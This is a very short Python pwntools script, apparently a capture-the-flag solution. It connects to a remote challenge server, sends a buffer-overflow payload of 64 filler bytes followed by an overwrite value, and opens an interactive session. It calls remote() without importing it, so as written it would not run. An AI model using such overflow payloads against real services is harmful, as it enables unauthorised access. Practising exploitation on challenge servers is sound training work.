import pwn
io = remote("ycep.dismgryphons.com", 3002)
payload = "A"*64 + "H001"
io.sendline(payload)
io.interactive()